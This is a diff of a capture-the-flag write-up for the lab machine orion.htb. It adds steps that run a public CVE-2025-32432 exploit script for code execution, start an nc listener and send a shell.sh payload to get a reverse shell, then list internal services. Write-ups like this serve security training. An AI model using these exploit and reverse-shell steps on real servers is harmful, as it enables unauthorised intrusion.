@@ -14,19 +14,7 @@ Lets start with an nmap scan:
 
 	nmap 10.129.77.211 -sV -sC 
 
-	Nmap scan report for orion.htb (10.129.77.211)
-	Host is up (0.11s latency).
-	Not shown: 998 closed tcp ports (reset)
-	PORT   STATE SERVICE VERSION
-	22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
-	| ssh-hostkey: 
-	|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
-	|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
-	80/tcp open  http    nginx 1.18.0 (Ubuntu)
-	|_http-server-header: nginx/1.18.0 (Ubuntu)
-	|_http-title: Orion Telecom
-	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
+- Our scan reveals that there are 2 open TCP ports, 22 and 80.
 
 Since weve got a website lets add the ip to the hosts file:
 
@@ -56,12 +44,41 @@ Note:
 
 - The path /var/lib/php/sessions/sess_<sessionID> was found to work in this instance.
 
-A exploit script can be found at: https://github.com/c0gnit00/CVE-2025-32432
+
+A working exploit script can be found at: https://github.com/c0gnit00/CVE-2025-32432
+
+- Thankfully for us, c0gnit00 modified the exploit specificly for this CTF.
+
+Lets test out the script and try to get remote code execution (RCE):
+
+	./exploit.py -u http://orion.htb/ -c 'id'
+
+As we can see, it returns:
+
+	uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+Now that we've got RCE, lets get a shell on the server:
+
+- First setup the listener:
+
+		nc -nlp 5555
+
+- Then use the provided shell.sh script to connect to the server:
+
+		./exploit.py -u http://orion.htb/ -c "$(cat shell.sh)"
 
 
+Now that we've got a shell, lets see what network services are listening for connections:
 
+	ss -ntlp
 
+- Port 22 (ssh)
+- Port 23 (Telnet) on 127.0.0.1
+- Port 53 (DNS)
+- Port 80 (nginx)
+- Port 3306 (MySQL) on 127.0.0.1
 
+We can now see new services, Telnet and MySQL, that we didnt see before with our nmap scan because they were not exposed to the outside world.
 
 
 
